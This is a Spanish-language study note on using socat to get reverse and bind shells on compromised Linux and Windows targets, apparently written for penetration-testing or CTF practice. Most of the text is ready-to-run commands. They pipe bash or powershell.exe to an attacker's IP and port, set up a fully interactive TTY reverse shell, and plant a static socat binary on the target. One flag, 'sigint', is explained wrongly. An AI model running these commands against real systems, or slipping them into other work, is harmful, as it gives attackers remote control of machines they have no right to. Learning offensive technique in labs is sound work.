Socat es similar a netcat en muchos aspectos, pero fundamentalmente diferente en otros tantos. La forma más sencilla de entender socat es pensar en un conector entre dos puntos.

-------------------------------
<h2>Reverse Shells</h2>
La sintaxis de socat se complica bastante más que la de netcat.

`socat TCP-L:<puerto> -`

Esto está tomando dos puntos (un puerto en escucha y el standard input) y conectándolos.La shell resultante no es estable.

En Windows podríamos usar este comando para conectarnos de vuelta: `socat TCP:<ip_local>:<puerto_local> EXEC:powershell.exe,pipes`

La opción `pipes` se usa para forzar que powershell use el input output al estilo Unix.

El comando equivalente para un objetivo Linux: `socat TCP:<ip_local>:<puerto_local> EXEC:"bash -li"`

--------------------------------------
<h2>Bind Shells</h2>
En un objetivo Linux, usaríamos el siguiente comando:

`socat TCP-L:<puerto> EXEC:"bash -li"`

Y en uno Windows:

`socat TCP-L:<puerto> EXEC:powershell.exe,pipes`

Sin importar el objetivo, usamos el siguiente comando para conectarnos desde nuestra máquina al listener activo:

`socat TCP:<ip_objetivo>:<puerto_objetivo> -`

--------------------------------------
Veamos ahora uno de los usos más poderosos de Socat: una tty Linux reverse shell totalmente estable. Esto sólo funcionará si el objetivo es Linux.

Esta es la sintaxis del listener:

``socat TCP-L:<port> FILE:`tty`,raw,echo=0``

Estamos conectando dos partes entre sí, en este caso un puerto en escucha y un archivo. Específicamente, estamos pasando la TTY actual como un archivo y configurando echo a 0. Esto es lo mismo que hacer `Ctrl+Z` y `stty raw -echo; fg`.

El primer listener puede ser conectado a cualquier payload. Sin embargo, este listener especial necesita ser activado a través de un comando de listener específico. Para que esto funcione, la máquina objetivo debe tener socat instalado, lo que no siempre pasa. Por suerte esto se puede remediar subiendo a la máquina un [binario precompilado de socat](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true).

El comando especial es así:

`socat TCP:<ip_atacante>:<puerto_atacante> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

Vamos a ver qué significa:

- `pty`: Reserva un pseudoterminal en el objetivo.
- `stderr`: Se asegura de que cualquier mensaje de error se muestre en la shell.
- `sigint`: Crea un proceso en una nueva sesión.
- `sane`: Estabiliza la terminal intentando normalizarla.

Veamos un ejemplo. En la parte izquierda tenemos un listener corriendo en nuestra máquina local y a la derecha una simulación del objetivo comprometido.

>[!IMPORTANT] La shell de socat es totalmente interactiva, lo que facilita mucho la explotación posterior.

![[Pasted image 20251124173926.png]]

>[!TIP] Si no funciona bien, conviene añadir `-d -d` al comando para aumentar la verbosidad.

